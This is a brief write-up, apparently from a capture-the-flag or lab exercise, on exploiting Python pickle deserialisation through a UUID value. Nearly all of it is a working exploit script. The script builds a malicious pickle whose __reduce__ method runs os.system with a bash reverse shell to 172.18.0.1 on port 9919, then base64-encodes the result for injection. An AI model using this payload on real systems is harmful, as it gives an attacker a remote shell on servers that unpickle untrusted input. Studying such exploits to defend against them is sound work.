# Pickle deserialisation in UUID
Very similar examples exist but I already had the idea in place before I found some geezer that had pretty much the same setup rip
his exploit is neater so used it aswell
https://medium.com/gdg-vit/deserialization-attacks-d312fbe58e7d

```python
import os
import pickle
import base64

payload = "bash -c \\'bash -i >& /dev/tcp/172.18.0.1/9919 0>&1\\'"

class Exploit(object):
    def __reduce__(self):
        return (eval,(f"os.system('{payload}')",))


exploitPickled = pickle.dumps(Exploit())
print(base64.b64encode(exploitPickled))
```